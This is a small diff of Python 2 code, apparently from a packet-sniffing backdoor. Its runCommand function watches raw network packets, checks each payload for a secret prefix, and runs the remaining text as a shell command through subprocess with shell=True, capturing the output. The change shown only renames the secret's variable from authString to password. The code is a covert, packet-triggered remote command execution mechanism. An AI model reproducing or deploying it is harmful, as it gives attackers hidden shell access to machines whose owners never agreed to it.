@@ -58,11 +58,11 @@ def runCommand(packet):
     if packet.haslayer(IP) and packet.haslayer(Raw):
         print packet.show
         data = packet['Raw'].load
-        if data.startswith(authString):
-            data = data[len(authString):]
+        if data.startswith(password):
+            data = data[len(password):]
             print "Running command " + data
             output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            output = authString + output.stdout.read() + output.stderr.read()
+            output = password + output.stdout.read() + output.stderr.read()
             print output
 
 def main():
